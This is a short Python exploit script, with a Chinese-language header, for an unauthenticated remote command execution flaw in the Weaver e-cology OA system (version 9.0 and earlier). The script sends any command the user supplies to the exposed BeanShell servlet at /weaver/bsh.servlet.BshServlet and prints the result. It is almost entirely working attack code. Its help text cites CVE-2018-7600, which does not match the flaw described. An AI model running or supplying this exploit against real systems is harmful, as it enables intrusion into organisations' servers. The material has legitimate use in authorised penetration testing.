'''
ecology-javabeanshell-rce  泛微e-cology OA系统远程代码执行漏洞
writen by ophxc
漏洞描述：泛微e-cology OA系统存在java Beanshell接口，攻击者调用该Beanshell可以被未授权访问接口，构造特定的数据请求绕过OA自带的一些安全限制进行远程命令执行。
受影响版本:泛微e-cology<=9.0
'''
import  requests
import argparse
import re

parser=argparse.ArgumentParser(description="usage of CVE-2018-7600")
parser.add_argument("-u","--url",help="the target url",required=True)
parser.add_argument("-c","--command",help="the command you want to excute ")
args=parser.parse_args()

url=args.url
cmd=args.command

url="http://"+url+"/weaver/bsh.servlet.BshServlet"
data={
    "bsh.script":"exec(\""+cmd+"\")"
}
res=requests.post(url=url,data=data)
text=re.findall(r'<pre>(.*)</pre>',res.text)
print("the command's result is : "+text[1])
